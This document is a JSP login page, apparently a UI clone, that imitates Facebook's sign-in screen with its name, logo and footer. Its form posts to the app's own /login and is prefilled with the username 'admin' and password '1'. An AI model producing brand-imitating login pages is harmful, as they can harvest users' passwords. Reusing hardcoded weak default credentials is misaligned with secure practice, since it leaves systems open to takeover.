<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="icon" href="/html/login/images/fb_logo.svg">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
          integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
          crossorigin="anonymous" referrerpolicy="no-referrer"/>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/html/login/CSS/style.css">
</head>

<body>
<main>
    <div class="row">
        <div class="col-logo">
            <img src="html/login/images/fb_logo.svg" alt="Logo">
            <h2>Facebook helps you connect and share with the people in your life.</h2>
        </div>
        <div class="col-form">
            <div class="form-container">
                <form method="post" action="/login">
                <input type="text" name="username" placeholder="Email address or phone number" value="admin">
                <input type="password" name="password" placeholder="Password" value="1">
                <button class="btn-login" type="submit">Login</button>
                <a href="#">Forgotten password?</a>
                <button class="btn-new">Create new Account</button>
                </form>
            </div>
            <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
        </div>
    </div>
</main>
<footer>
    <div class="footer-contents">
        <ol>
            <li>English (UK)</li>
            <li><a href="#">മലയാളം</a></li>
            <li><a href="#">தமிழ்</a></li>
            <li><a href="#">తెలుగు</a></li>
            <li><a href="#">বাংলা</a></li>
            <li><a href="#">اردو</a></li>
            <li><a href="#">हिन्दी</a></li>
            <li><a href="#">ಕನ್ನಡ</a></li>
            <li><a href="#">Español</a></li>
            <li><a href="#">Português (Brasil)</a></li>
            <li><a href="#">Français (France)</a></li>
            <li>
                <button>+</button>
            </li>
        </ol>

        <ol>
            <li><a href="#">Sign Up</a></li>
            <li><a href="#">Log In </a></li>
            <li><a href="#">Messenger</a></li>
            <li><a href="#">Facebook Lite</a></li>
            <li><a href="#">Watch</a></li>
            <li><a href="#">People</a></li>
            <li><a href="#">Pages</a></li>
            <li><a href="#">Page categories</a></li>
            <li><a href="#">Places</a></li>
            <li><a href="#">Games</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Marketplace</a></li>
            <li><a href="#">Facebook</a></li>
            <li><a href="#">PayGroups</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Oculus</a></li>
            <li><a href="#">Portal</a></li>
            <li><a href="#">Instagram</a></li>
            <li><a href="#">Local</a></li>
            <li><a href="#">Sign Up</a></li>
            <li><a href="#">Log In </a></li>
            <li><a href="#">Messenger</a></li>
            <li><a href="#">Facebook Lite</a></li>
            <li><a href="#">Watch</a></li>
            <li><a href="#">People</a></li>
            <li><a href="#">Pages</a></li>
            <li><a href="#">Page categories</a></li>
            <li><a href="#">Places</a></li>
            <li><a href="#">Games</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Marketplace</a></li>
            <li><a href="#">Facebook</a></li>
            <li><a href="#">PayGroups</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Oculus</a></li>
            <li><a href="#">Portal</a></li>
            <li><a href="#">Instagram</a></li>
            <li><a href="#">Local</a></li>
        </ol>
        <small>Facebook © 2021</small>
    </div>
</footer>
</body>

</html>